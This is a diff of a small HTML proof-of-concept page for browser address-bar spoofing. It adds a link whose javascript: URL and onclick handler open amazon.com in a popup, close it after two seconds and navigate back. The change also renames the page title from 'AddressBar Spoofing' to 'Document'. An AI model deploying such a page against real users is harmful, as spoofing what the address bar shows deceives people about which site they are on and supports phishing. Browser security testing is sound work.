@@ -3,31 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AddressBar Spoofing</title>
+    <title>Document</title>
 </head>
 <body>
+        <a id="spoof-link" href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
 
     <script>
         function startSpoof() {
-  const popup = window.open("about:blank", "_blank");
+            const link = document.getElementById("spoof-link");
+            if (link) {
+                const p = document.createElement("p");
+                p.textContent = "Spoofing";
+                link.replaceWith(p);
+            }
 
-  if (!popup) {
-    alert("Pop-up diblokir. Izinkan pop-up lalu coba lagi.");
-    return;
-  }
+            const popup = window.open("about:blank", "_blank");
 
-  popup.location.href = "https://www.amazon.com/";
+            if (!popup) {
+                alert("Pop-up diblokir. Izinkan pop-up lalu coba lagi.");
+                return;
+            }
 
-  setTimeout(() => {
-    try {
-      popup.close();
-    } catch (err) {
-      console.warn("Gagal menutup popup:", err);
-    }
+            popup.location.href = "https://www.amazon.com/";
 
-    window.history.back();
-  }, 5000); // Tunggu 5 detik sebelum menutup popup dan kembali ke halaman sebelumnya
-}
+            setTimeout(() => {
+                try {
+                    popup.close();
+                } catch (err) {
+                    console.warn("Gagal menutup popup:", err);
+                }
+
+                window.history.back();
+            }, 2000);
+        }
     </script>
 </body>
 </html>
